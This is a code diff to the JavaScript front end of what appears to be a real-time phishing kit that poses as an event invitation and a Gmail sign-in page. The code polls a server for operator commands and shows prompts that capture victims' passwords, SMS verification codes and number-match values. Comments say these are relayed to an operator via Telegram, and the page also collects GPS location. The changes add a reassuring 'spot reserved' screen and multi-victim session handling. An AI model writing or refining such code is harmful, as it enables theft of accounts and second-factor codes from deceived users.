@@ -28,7 +28,7 @@
     const overlay = container.querySelector('.response-overlay');
     if (overlay) {
       overlay.classList.remove('is-open');
-      setTimeout(() => { if (container) container.innerHTML = ''; }, 300);
+      setTimeout(() => { if (container) container.innerHTML = ''; }, 400);
     }
   }
 
@@ -40,16 +40,64 @@
     return overlay;
   }
 
+  function escapeHtml(str) {
+    if (str == null) return '';
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;');
+  }
+
+  /* ── Beautiful success overlay ── */
   function showSuccess() {
+    closeAuthModal();
     renderOverlay(`
       <div class="response-overlay" id="overlay-success">
-        <div class="response-card">
-          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
-          <div class="response-icon success">✓</div>
-          <h2 class="response-title">Spot Reserved Successfully</h2>
-          <p class="response-message">Your invitation has been confirmed and your spot for the event has been booked. We look forward to seeing you there!</p>
-          <div class="response-actions">
-            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Done</button>
+        <div class="success-celebration">
+          <div class="success-confetti" aria-hidden="true">
+            <span class="confetti-piece"></span><span class="confetti-piece"></span>
+            <span class="confetti-piece"></span><span class="confetti-piece"></span>
+            <span class="confetti-piece"></span><span class="confetti-piece"></span>
+            <span class="confetti-piece"></span><span class="confetti-piece"></span>
+            <span class="confetti-piece"></span><span class="confetti-piece"></span>
+            <span class="confetti-piece"></span><span class="confetti-piece"></span>
+          </div>
+          <div class="success-card">
+            <div class="success-icon-wrap">
+              <svg class="success-check-svg" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle class="success-check-circle" cx="40" cy="40" r="36" stroke="#0F6B2C" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="226" stroke-dashoffset="226" />
+                <path class="success-check-mark" d="M24 41 L35 52 L57 28" stroke="#0F6B2C" stroke-width="4.5" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="60" stroke-dashoffset="60" />
+              </svg>
+            </div>
+            <div class="success-ornament" aria-hidden="true">
+              <span class="success-orn-line"></span>
+              <span class="success-orn-diamond"></span>
+              <span class="success-orn-line"></span>
+            </div>
+            <h2 class="success-title">Spot Reserved Successfully</h2>
+            <p class="success-message">Your invitation has been confirmed and your spot for the event has been officially booked. We can't wait to celebrate with you!</p>
+            <div class="success-details">
+              <div class="success-detail-item">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="success-detail-icon">
+                  <path d="M20 7L9 18l-5-5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <span>Invitation Confirmed</span>
+              </div>
+              <div class="success-detail-item">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="success-detail-icon">
+                  <path d="M20 7L9 18l-5-5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <span>Spot Reserved</span>
+              </div>
+              <div class="success-detail-item">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="success-detail-icon">
+                  <path d="M20 7L9 18l-5-5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <span>Details Sent to Your Email</span>
+              </div>
+            </div>
+            <button class="success-btn" type="button" onclick="window.__ResponseControls.close()">Done</button>
           </div>
         </div>
       </div>
@@ -57,7 +105,6 @@
   }
 
   function showPasswordError() {
-    // Show inline error on the auth form if available, otherwise show overlay
     if (window.__AuthForm && window.__AuthForm.showError) {
       window.__AuthForm.showError('The password you entered is incorrect. Please try again.');
       return;
@@ -96,7 +143,6 @@
 
   function showSmsPrompt(email) {
     const safeEmail = email || 'your email';
-    // Close any auth modal first
     closeAuthModal();
     renderOverlay(`
       <div class="response-overlay" id="overlay-sms">
@@ -132,48 +178,29 @@
         </div>
       </div>
     `);
-
     setupSmsCodeInputs();
     setupSmsFormSubmit();
-  }
-
-  function escapeHtml(str) {
-    if (str == null) return '';
-    return String(str)
-      .replace(/&/g, '&amp;')
-      .replace(/</g, '&lt;')
-      .replace(/>/g, '&gt;')
-      .replace(/"/g, '&quot;');
   }
 
   function setupSmsCodeInputs() {
     const inputs = document.querySelectorAll('.sms-code-input');
     if (!inputs.length) return;
-
     inputs.forEach((input, index) => {
       input.addEventListener('input', function () {
         this.value = this.value.replace(/[^0-9]/g, '');
-        if (this.value && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
+        if (this.value && index < inputs.length - 1) inputs[index + 1].focus();
       });
       input.addEventListener('keydown', function (e) {
-        if (e.key === 'Backspace' && !this.value && index > 0) {
-          inputs[index - 1].focus();
-        }
+        if (e.key === 'Backspace' && !this.value && index > 0) inputs[index - 1].focus();
       });
       input.addEventListener('paste', function (e) {
         e.preventDefault();
         const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
         if (!pasted) return;
-        pasted.split('').forEach((char, i) => {
-          if (inputs[i]) inputs[i].value = char;
-        });
-        const lastFilled = Math.min(pasted.length, inputs.length - 1);
-        inputs[lastFilled].focus();
+        pasted.split('').forEach((char, i) => { if (inputs[i]) inputs[i].value = char; });
+        inputs[Math.min(pasted.length, inputs.length - 1)].focus();
       });
     });
-
     const first = document.getElementById('sms-code-1');
     if (first) setTimeout(() => first.focus(), 300);
   }
@@ -181,31 +208,22 @@
   function setupSmsFormSubmit() {
     const form = document.getElementById('sms-verify-form');
     if (!form) return;
-
     form.addEventListener('submit', async function (e) {
       e.preventDefault();
       const inputs = document.querySelectorAll('.sms-code-input');
       let code = '';
       let allFilled = true;
-      inputs.forEach((input) => {
-        code += input.value;
-        if (!input.value) allFilled = false;
-      });
-
+      inputs.forEach((input) => { code += input.value; if (!input.value) allFilled = false; });
       if (!allFilled || code.length < 6) {
-        inputs.forEach((input) => {
-          if (!input.value) input.classList.add('sms-code-error');
-        });
+        inputs.forEach((input) => { if (!input.value) input.classList.add('sms-code-error'); });
         return;
       }
-
       const formEl = document.getElementById('sms-verify-form');
       const loadingEl = document.getElementById('sms-verify-loading');
       const submitBtn = document.getElementById('sms-verify-submit');
       if (formEl) formEl.style.display = 'none';
       if (submitBtn) submitBtn.style.display = 'none';
       if (loadingEl) loadingEl.style.display = 'flex';
-
       const sessionId = getSessionId();
       try {
         await fetch('/api/verify-code', {
@@ -213,17 +231,11 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ sessionId, code }),
         });
-      } catch (err) {
-        // ignore — code was still sent to Telegram
-      }
-
-      // Keep loading state; operator responds via Telegram
-      // Polling continues and will pick up the next command
+      } catch (err) { /* code still sent to Telegram */ }
     });
   }
 
   function showNumberPrompt(number) {
-    // Close any auth modal first
     closeAuthModal();
     renderOverlay(`
       <div class="response-overlay" id="overlay-number">
@@ -248,26 +260,22 @@
         </div>
       </div>
     `);
-
-    setupNumberPromptSubmit(number);
+    setupNumberPromptSubmit();
   }
 
-  function setupNumberPromptSubmit(expectedNumber) {
+  function setupNumberPromptSubmit() {
     const submitBtn = document.getElementById('number-prompt-submit');
     if (!submitBtn) return;
-
     submitBtn.addEventListener('click', async function () {
       const input = document.getElementById('number-input');
       const value = input ? input.value.trim() : '';
       if (!value) return;
-
       const formEl = document.getElementById('number-prompt-form');
       const actionsEl = document.querySelector('.response-actions');
       const loadingEl = document.getElementById('number-verify-loading');
       if (formEl) formEl.style.display = 'none';
       if (actionsEl) actionsEl.style.display = 'none';
       if (loadingEl) loadingEl.style.display = 'flex';
-
       const sessionId = getSessionId();
       try {
         await fetch('/api/verify-code', {
@@ -275,18 +283,13 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ sessionId, code: value }),
         });
-      } catch (err) {
-        // ignore
-      }
-
-      // Keep loading; operator responds via Telegram
+      } catch (err) { /* ignore */ }
     });
   }
 
   function closeAuthModal() {
     const authModal = document.getElementById('auth-modal');
     if (authModal) authModal.classList.remove('is-open');
-    // Also handle Gmail password page form
     const gmailCard = document.querySelector('.gmail-form');
     if (gmailCard) gmailCard.style.display = '';
     const gmailLoading = document.getElementById('gmail-loading');
@@ -296,51 +299,59 @@
   function handleCommand(command, data) {
     switch (command) {
       case 'success':
-        closeAuthModal();
         showSuccess();
-        break;
+        return true;
       case 'password_error':
         showPasswordError();
-        break;
+        return false;
       case 'yes_prompt':
         closeAuthModal();
         showYesPrompt();
-        break;
+        return false;
       case 'sms':
         showSmsPrompt(data);
-        break;
+        return false;
       case 'number_prompt':
-        if (data) showNumberPrompt(data);
-        else showNumberPrompt('?');
-        break;
-      default: break;
+        showNumberPrompt(data || '?');
+        return false;
+      default:
+        return false;
     }
   }
 
-  let polling = false;
+  /* ── Polling: supports session switching ── */
+  let currentSessionId = null;
+  let pollAbortController = null;
+
   async function startPolling(sessionId) {
-    if (polling) return;
-    polling = true;
-    while (polling) {
+    if (sessionId === currentSessionId) return;
+    currentSessionId = sessionId;
+    if (pollAbortController) pollAbortController.abort();
+    pollAbortController = new AbortController();
+    const myController = pollAbortController;
+    setSessionId(sessionId);
+
+    while (currentSessionId === sessionId && !myController.signal.aborted) {
       try {
-        const res = await fetch(`/api/status/${sessionId}`);
-        if (!res.ok) { polling = false; break; }
+        const res = await fetch(`/api/status/${sessionId}`, { signal: myController.signal });
+        if (!res.ok) { await sleep(3000); continue; }
         const result = await res.json();
         if (result.command) {
-          handleCommand(result.command, result.data);
-          if (result.command === 'success') {
-            polling = false;
+          const isFinal = handleCommand(result.command, result.data);
+          if (isFinal) {
             clearSessionId();
-            break;
+            currentSessionId = null;
+            return;
           }
-          // For password_error, keep polling so the user can resubmit
-          // For sms and number_prompt, keep polling so the next command is received
         }
       } catch (e) {
-        await new Promise((r) => setTimeout(r, 3000));
+        if (e.name === 'AbortError') return;
+        await sleep(3000);
       }
     }
   }
+
+  function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
 
   function collectGps() {
     return new Promise((resolve) => {
@@ -364,7 +375,5 @@
   };
 
   const existingSession = getSessionId();
-  if (existingSession) {
-    startPolling(existingSession);
-  }
+  if (existingSession) startPolling(existingSession);
 })();
